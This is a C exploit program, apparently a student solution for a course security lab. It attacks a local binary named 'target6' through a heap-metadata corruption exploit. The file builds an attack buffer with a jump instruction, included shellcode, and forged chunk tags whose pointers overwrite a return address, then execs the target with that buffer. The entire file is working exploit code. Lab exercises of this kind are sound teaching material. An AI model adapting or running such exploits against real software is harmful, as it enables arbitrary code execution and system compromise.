#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

//My own constants
#define BUFSIZE 81
#define TARGET_RA_ADDR 0x202dfe68
#define SHELL_LENGTH 45

int main(void)
{
	char *args[3];
	char *env[1];


	//printf("Sploit6.c: Before making attack_buffer:\n");
	
	//Making the attack buffer
	char attack_buffer[BUFSIZE];
	

	//First fill attack buffer with non null characters to avoid reaching nulls in random places when sending buffer
	int i;
	for(i = 0; i< BUFSIZE;i++)
	{
		attack_buffer[i] = 0x01;
	}

	//p's fake tag's previous - jump by 4 bytes instruction
	short *a = (short *) &attack_buffer[0];
	*a = 0x04eb;

	//p's fake tag's next - some garbage value that would be overwritten
	char *b = (char *) &attack_buffer[4];
	//*b = *b | 0x1;	//garbage vlalue which does not matter
	
	//Copy in shellcode afterwards
	for(i = 0; i< SHELL_LENGTH;i++)
	{
		attack_buffer[8+i] = shellcode[i];
	}

	//q's fake tag's previous - points to p's previous
	int *c = (int *) &attack_buffer[72];
	*c = 0x104ee28;

	//q's fake tag's next - points to return address
	int *d = (int *) &attack_buffer[76];
	*d = TARGET_RA_ADDR;
	
	attack_buffer[BUFSIZE - 1] = '\0';


	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
	fprintf(stderr, "execve failed.\n");

	return 0;
}
